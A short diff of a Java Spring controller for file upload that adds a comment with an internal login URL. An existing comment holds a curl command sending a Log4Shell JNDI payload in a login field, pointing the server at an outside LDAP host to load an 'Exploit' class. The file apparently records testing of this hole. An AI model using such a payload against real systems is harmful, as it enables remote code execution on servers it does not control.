@@ -9,7 +9,7 @@ import org.springframework.web.multipart.MultipartFile;
 
 import javax.servlet.http.HttpServletRequest;
 import java.io.*;
-
+//    http://192.168.2.11:8080/vueDemo/#/login
 @RestController
 public class FileUpload {
     //    curl --location --request POST '192.73.0.18:8080/demo-0.0.1-SNAPSHOT/loginIn' --form 'username="${jndi:ldap://192.73.1.63:1389/Exploit}"'
